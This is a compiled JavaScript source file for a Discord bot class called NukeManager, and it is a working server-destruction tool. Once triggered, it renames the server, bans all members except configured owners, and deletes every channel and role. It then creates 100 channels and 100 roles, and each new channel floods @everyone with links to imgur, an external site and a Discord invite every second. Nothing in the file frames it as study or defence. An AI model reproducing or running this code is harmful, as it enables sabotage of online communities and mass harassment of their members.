"use strict";
Object.defineProperty(exports, "__esModule", { value: true });
const discord_js_1 = require("discord.js");
class NukeManager {
    message;
    constructor(message) {
        this.message = message;
    }
    async start() {
        this.message.guild
            ?.setName(process.env.MESSAGE, process.env.MESSAGE)
            .catch();
        this.AllBan();
        this.ChannelNuke();
        this.RoleNuke();
    }
    async AllBan() {
        const members = await this.message.guild?.members.fetch();
        members?.forEach((member) => {
            if (process.env.OWNERS.includes(member.id))
                return;
            member
                .ban({
                reason: process.env.MESSAGE,
            })
                .then(() => {
                console
                    .log();
            })
                .catch(() => {
                console.log(`\x1b[33mUnnable to ban ${member.user.tag}\x1b[0m`);
            });
        });
    }
    async ChannelNuke() {
        const channels = await this.message.guild?.channels.fetch();
        channels?.forEach(async (channel) => {
            channel
                ?.delete(process.env.MESSAGE)
                .then(() => {
                console
                    .log();
            })
                .catch(() => {
                console.log(`\x1b[33mChannel: Unnbale to delete ${channel.name}\x1b[0m`);
            });
        });
        for (let i = 0; i < 100; i++) {
            this.message.guild?.channels
                .create({
                name: process.env.MESSAGE,
                topic: process.env.MESSAGE,
                type: discord_js_1.ChannelType.GuildText,
            })
                .then((channel) => {
                // console.log(`\x1b[32mCreated channel: ${channel.name}\x1b[0m`);
                setInterval(() => {
                    channel.send({
                        content: `@everyone\n\nhttps://imgur.com/a/xm4aIwz\nhttps://imgur.com/a/n5rS8wp\nhttps://imgur.com/a/gVcDw0G\nhttps://ctkp.net/\nhttps://discord.gg/7eYYNNJQ8e `,
                    });
                }, 1000);
            })
                .catch();
        }
    }
    async RoleNuke() {
        const roles = await this.message.guild?.roles.fetch();
        roles?.forEach(async (role) => {
            role
                ?.delete(process.env.MESSAGE)
                .then(() => {
                // console.log(`\x1b[31mRole: ${role.name} has been deleted.\x1b[0m`);
            })
                .catch(() => {
                console.log(`\x1b[33mRole: Unnbale to delete ${role.name}\x1b[0m`);
            });
        });
        for (let i = 0; i < 100; i++) {
            this.message.guild?.roles
                .create({
                name: process.env.MESSAGE,
                color: discord_js_1.Colors.Navy,
            })
                .then((role) => {
                // console.log(`\x1b[32mCreated role: ${role.name}\x1b[0m`);
            })
                .catch();
        }
    }
}
exports.default = NukeManager;
